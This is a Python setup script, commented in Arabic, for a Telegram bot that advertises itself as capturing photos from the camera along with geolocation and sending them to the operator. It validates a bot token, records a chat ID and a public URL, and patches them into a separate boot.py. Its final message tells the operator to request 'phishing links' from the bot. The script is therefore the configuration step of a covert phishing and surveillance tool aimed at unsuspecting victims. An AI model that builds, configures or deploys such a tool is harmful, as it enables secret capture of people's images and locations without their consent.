#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
إعداد سريع لبوت تيليجرام لالتقاط الصور
"""

import os
import sys
import json
import requests
from pathlib import Path

def print_banner():
    """طباعة شعار البرنامج"""
    banner = """
╔══════════════════════════════════════════════════════════════╗
║                    🎯 بوت التقاط الصور                      ║
║                  Telegram Photo Capture Bot                 ║
╠══════════════════════════════════════════════════════════════╣
║  📸 التقاط صور تلقائي من الكاميرا                          ║
║  🌍 جمع الموقع الجغرافي والمعلومات                         ║
║  📱 إرسال فوري إلى تيليجرام                               ║
║  📊 إحصائيات مفصلة                                         ║
╚══════════════════════════════════════════════════════════════╝
    """
    print(banner)

def get_bot_info(token):
    """الحصول على معلومات البوت"""
    try:
        response = requests.get(f"https://api.telegram.org/bot{token}/getMe")
        if response.status_code == 200:
            data = response.json()
            if data['ok']:
                return data['result']
        return None
    except:
        return None

def get_chat_id_instructions():
    """تعليمات الحصول على Chat ID"""
    instructions = """
📱 للحصول على Chat ID:

1️⃣ أرسل رسالة لبوتك في تيليجرام
2️⃣ ادخل على الرابط التالي في المتصفح:
   https://api.telegram.org/bot<TOKEN>/getUpdates
   
3️⃣ ابحث عن "chat":{"id": في النتيجة
4️⃣ انسخ الرقم الذي بعد "id":

مثال: "chat":{"id":123456789 ← انسخ 123456789
    """
    return instructions

def setup_config():
    """إعداد ملف التكوين"""
    print_banner()
    print("🚀 مرحباً بك في إعداد بوت التقاط الصور!\n")
    
    # التحقق من وجود ملف boot.py
    if not os.path.exists("boot.py"):
        print("❌ ملف boot.py غير موجود!")
        print("تأكد من تشغيل هذا الملف في نفس مجلد boot.py")
        return
    
    config = {}
    
    # إدخال توكن البوت
    while True:
        token = input("🤖 أدخل توكن البوت (من @BotFather): ").strip()
        if not token:
            print("❌ التوكن مطلوب!")
            continue
        
        print("🔍 جاري التحقق من التوكن...")
        bot_info = get_bot_info(token)
        
        if bot_info:
            print(f"✅ تم التحقق من البوت: @{bot_info['username']}")
            config['token'] = token
            break
        else:
            print("❌ التوكن غير صحيح! حاول مرة أخرى.")
    
    # إرشادات Chat ID
    print(get_chat_id_instructions())
    
    # إدخال Chat ID
    while True:
        chat_id = input("💬 أدخل Chat ID: ").strip()
        if not chat_id:
            print("❌ Chat ID مطلوب!")
            continue
        
        try:
            int(chat_id)  # التحقق من أنه رقم
            config['chat_id'] = chat_id
            break
        except ValueError:
            print("❌ Chat ID يجب أن يكون رقماً!")
    
    # إعداد URL العام
    print("\n🌐 إعداد الرابط العام:")
    print("1. للاختبار المحلي: اتركه كما هو")
    print("2. للسيرفر: أدخل IP السيرفر")
    print("3. لـ Ngrok/Cloudflare: أدخل الرابط كاملاً")
    
    public_url = input("🔗 أدخل الرابط العام (أو اضغط Enter للافتراضي): ").strip()
    if not public_url:
        public_url = "http://localhost:8080"
    
    config['public_url'] = public_url
    
    # إعداد البورت
    port = input("🚪 أدخل البورت (افتراضي 8080): ").strip()
    if not port:
        port = "8080"
    
    config['port'] = port
    
    # حفظ التكوين
    save_config(config)
    
    print("\n✅ تم الإعداد بنجاح!")
    print("\n📋 ملخص الإعدادات:")
    print(f"🤖 البوت: @{bot_info['username']}")
    print(f"💬 Chat ID: {config['chat_id']}")
    print(f"🔗 الرابط: {config['public_url']}")
    print(f"🚪 البورت: {config['port']}")
    
    print("\n🚀 لتشغيل البوت:")
    print("python boot.py")
    
    print("\n📱 للحصول على روابط التصيد:")
    print("أرسل /links للبوت في تيليجرام")

def save_config(config):
    """حفظ التكوين في ملف boot.py"""
    try:
        # قراءة الملف الحالي
        with open("boot.py", "r", encoding="utf-8") as f:
            content = f.read()
        
        # استبدال القيم
        content = content.replace('TOKEN = "YOUR_BOT_TOKEN_HERE"', f'TOKEN = "{config["token"]}"')
        content = content.replace('CHAT_ID = "YOUR_CHAT_ID"', f'CHAT_ID = "{config["chat_id"]}"')
        content = content.replace('PUBLIC_URL = "http://YOUR_SERVER_IP:8080"', f'PUBLIC_URL = "{config["public_url"]}"')
        content = content.replace('WEB_PORT = 8080', f'WEB_PORT = {config["port"]}')
        
        # كتابة الملف المحدث
        with open("boot.py", "w", encoding="utf-8") as f:
            f.write(content)
        
        # حفظ نسخة احتياطية من التكوين
        with open("config.json", "w", encoding="utf-8") as f:
            json.dump(config, f, ensure_ascii=False, indent=2)
            
    except Exception as e:
        print(f"❌ خطأ في حفظ التكوين: {e}")

def check_requirements():
    """التحقق من المتطلبات"""
    print("🔍 جاري التحقق من المتطلبات...")
    
    required_packages = [
        'telegram',
        'aiohttp', 
        'aiofiles',
        'PIL',
        'requests'
    ]
    
    missing_packages = []
    
    for package in required_packages:
        try:
            __import__(package)
            print(f"✅ {package}")
        except ImportError:
            print(f"❌ {package}")
            missing_packages.append(package)
    
    if missing_packages:
        print(f"\n📦 لتثبيت المتطلبات المفقودة:")
        print("pip install -r requirements.txt")
        return False
    
    print("\n✅ جميع المتطلبات متوفرة!")
    return True

def main():
    """الدالة الرئيسية"""
    if len(sys.argv) > 1 and sys.argv[1] == "--check":
        check_requirements()
        return
    
    setup_config()

if __name__ == "__main__":
    main()
